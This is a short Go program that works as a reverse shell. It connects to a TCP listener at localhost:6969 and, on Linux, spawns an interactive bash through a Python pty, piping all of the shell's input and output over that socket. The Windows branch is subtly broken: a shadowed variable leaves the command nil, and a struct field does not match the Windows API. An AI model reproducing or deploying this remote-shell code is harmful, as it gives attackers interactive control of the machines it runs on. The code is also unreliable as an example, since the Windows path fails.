package main

import (
	"net"
	"os"
	"os/exec"
	"runtime"
	"syscall"
)

func main() {
	if client, err := net.Dial("tcp", "localhost:6969"); err == nil {
		var cmd *exec.Cmd
		switch runtime.GOOS {
		case "linux":
			os.Setenv("TERM", "xterm-256color")
			cmd = exec.Command("/bin/bash", "-c", "python -c \"import pty; pty.spawn('/bin/bash')\"")
		case "windows":
			cmd := exec.Command("cmd.exe")
			cmd.SysProcAttr = &syscall.SysProcAttr{Foreground: false}
		}
		cmd.Stdin = client
		cmd.Stdout = client
		cmd.Stderr = client
		cmd.Run()
		client.Close()
	}
}
